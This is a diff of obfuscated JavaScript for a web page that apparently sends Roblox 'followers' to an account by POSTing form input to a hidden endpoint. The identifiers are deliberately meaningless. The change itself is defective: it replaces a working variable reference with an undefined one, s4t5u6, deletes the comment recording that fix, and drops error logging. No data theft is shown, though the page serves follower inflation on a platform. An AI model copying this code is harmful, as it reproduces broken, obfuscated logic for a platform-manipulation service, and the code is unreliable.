@@ -20,7 +20,7 @@ async function a1b2c3d4(p1q2r3, s4t5u7) {
     };
 
     try {
-        const m4n5o6 = await fetch(g8h9i0, {
+        const response = await fetch(g8h9i0, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
@@ -28,14 +28,13 @@ async function a1b2c3d4(p1q2r3, s4t5u7) {
             body: JSON.stringify(j1k2l3)
         });
 
-        if (m4n5o6.ok) {
-            x1b2z3("Success", "Successfully sent. Wait 2 or 4 minutes.", "success", "Okay");
+        if (response.ok) {
+            x1y2z3("Success", "successfully, Wait 2 or 4 minutes.", "success", "Okay");
         } else {
-            x1b2z3("Error", "Failed to send Followers to Roblox Account.", "error", "Retry");
+            x1y2z3("Error", "Failed to send Followers to Roblox Account.", "error", "Retry");
         }
     } catch (error) {
-        console.error("Error sending Followers", error);
-        x1b2z3("Error", "An error occurred while sending Followers", "error", "Retry");
+        x1y2z3("Error", "An error occurred while sending Followers", "error", "Retry");
     }
 }
 
@@ -45,14 +44,14 @@ document.addEventListener("DOMContentLoaded", function() {
         const s4t5u7 = document.getElementById("amount").value;
 
         if (!p1q2r3 || !s4t5u7) {
-            x1b2z3("Validation Error", "Please fill in all fields.", "warning", "Okay");
+            x1y2z3("Validation Error", "Please fill in all fields.", "warning", "Okay");
             return;
         }
 
         const v7w8x9 = {
             icon: "info",
             title: "<b>Is this correct? 👀</b>",
-            html: "Follow Amount: " + s4t5u7, // Cambiado de s4t5u6 a s4t5u7
+            html: "Follow Amount: " + s4t5u6,
             showDenyButton: true,
             confirmButtonText: "Confirm", 
             denyButtonText: "Cancel",
